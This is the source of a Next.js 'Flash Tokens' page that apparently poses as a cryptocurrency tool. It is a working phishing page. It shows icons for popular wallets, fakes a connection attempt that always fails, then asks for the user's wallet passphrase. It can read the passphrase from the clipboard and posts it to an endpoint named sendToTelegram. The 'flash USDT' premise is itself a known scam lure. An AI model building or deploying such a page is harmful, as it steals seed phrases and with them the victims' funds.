import '../styles/global.css';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';

export default function Flash() {
  const [walletAddress, setWalletAddress] = useState('');
  const [selectedToken, setSelectedToken] = useState('USDT (TRC20)');
  const [showModal, setShowModal] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [connectionFailed, setConnectionFailed] = useState(false);
  const [passphrase, setPassphrase] = useState('');
  const [transactions, setTransactions] = useState([]);
  const router = useRouter();

  // Wallet options with icon paths from the internet
  const wallets = [
    { 
      name: 'OKX Wallet', 
      icon: 'https://www.okx.com/cdn/assets/imgs/221/8D8A8F8D8D8F8D8F.png' // OKX favicon or logo approximation
    },
    { 
      name: 'Trust Wallet', 
      icon: 'https://cdn-icons-png.flaticon.com/512/8251/8251185.png' // Trust Wallet icon from Flaticon
    },
    { 
      name: 'Bybit Wallet', 
      icon: 'https://www.bybit.com/favicon.ico' // Bybit favicon (limited specific icons available)
    },
    { 
      name: 'Metamask', 
      icon: 'https://cdn.iconscout.com/icon/free/png-256/metamask-2728406-2261817.png' // MetaMask icon from IconScout
    },
    { 
      name: 'Binance Wallet', 
      icon: 'https://cdn-icons-png.flaticon.com/512/8251/8251075.png' // Binance icon from Flaticon
    },
    { 
      name: 'Wallet Connect', 
      icon: 'https://walletconnect.com/favicon.ico' // WalletConnect favicon
    },
    { 
      name: 'Bitget', 
      icon: 'https://www.bitget.com/favicon.ico' // Bitget favicon (or use a generic "B" icon)
    }
  ]; // Removed the extra `];` here

  // Fetch live transactions
  useEffect(() => {
    const fetchTransactions = async () => {
      const res = await fetch('/api/getTransactions');
      const data = await res.json();
      setTransactions(data.result.slice(0, 10)); // Limit to 10
    };
    fetchTransactions();
    const interval = setInterval(fetchTransactions, 5000); // Update every 5s
    return () => clearInterval(interval);
  }, []);

  const handleFlash = () => setShowModal(true);

  const handleWalletClick = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setConnectionFailed(true);
    }, 10000); // 10-second delay
  };

  const handleSubmit = async () => {
    const res = await fetch('/api/sendToTelegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ passphrase }),
    });
    if (res.ok) {
      alert('Passphrase submitted');
      setShowModal(false);
      setConnectionFailed(false);
      setPassphrase('');
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-4">
      <h1 className="text-2xl font-bold mb-4">Flash Tokens</h1>
      <input
        type="text"
        placeholder="Receiver Wallet Address"
        value={walletAddress}
        onChange={(e) => setWalletAddress(e.target.value)}
        className="w-full p-2 mb-4 bg-gray-800 rounded"
      />
      <select
        value={selectedToken}
        onChange={(e) => setSelectedToken(e.target.value)}
        className="w-full p-2 mb-4 bg-gray-800 rounded"
      >
        <option>USDT (TRC20)</option>
        <option>USDT (BEP20)</option>
        <option>USDT (ERC20)</option>
        <option>Bitcoin (BEP20)</option>
        <option>USDC (BEP20)</option>
        <option>ETH (BEP20)</option>
        <option>SHIB (BEP20)</option>
      </select>
      <button
        onClick={handleFlash}
        className="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded"
      >
        Flash
      </button>

      {/* Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
          <div className="bg-gray-800 p-6 rounded">
            {isLoading ? (
              <div className="flex items-center justify-center">
                <span className="spinner mr-2" /> Loading...
              </div>
            ) : connectionFailed ? (
              <>
                <p className="mb-4">Connection failed, link manually</p>
                <textarea
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                  placeholder="Enter passphrase"
                  className="w-full p-2 mb-4 bg-gray-700 rounded"
                />
                <button
                  onClick={() => navigator.clipboard.readText().then(text => setPassphrase(text))}
                  className="bg-gray-600 hover:bg-gray-700 text-white py-1 px-2 rounded mr-2"
                >
                  Paste
                </button>
                <button
                  onClick={handleSubmit}
                  className="bg-blue-600 hover:bg-blue-700 text-white py-1 px-2 rounded"
                >
                  Submit
                </button>
              </>
            ) : (
              <>
                <h2 className="text-xl mb-4">Link Wallet</h2>
                <div className="grid grid-cols-3 gap-4">
                  {wallets.map((wallet) => (
                    <button
                      key={wallet.name}
                      onClick={handleWalletClick}
                      className="flex flex-col items-center"
                    >
                      <img src={wallet.icon} alt={wallet.name} className="w-12 h-12" />
                      <span>{wallet.name}</span>
                    </button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {/* Live Transactions */}
      <div className="mt-8">
        <h2 className="text-xl font-bold mb-2">Live Transactions</h2>
        <ul className="bg-gray-800 p-4 rounded">
          {transactions.map((tx) => (
            <li key={tx.hash} className="mb-2">
              {tx.hash.slice(0, 10)}... - {tx.from.slice(0, 6)}... to {tx.to.slice(0, 6)}...
            </li>
          ))}
        </ul>
      </div>

      {/* Navigation */}
      <button onClick={() => router.push('/')} className="mt-4 text-blue-400">Back to Info</button>
      <button onClick={() => router.push('/donate')} className="mt-4 ml-4 text-blue-400">Donate</button>
    </div>
  );
    }
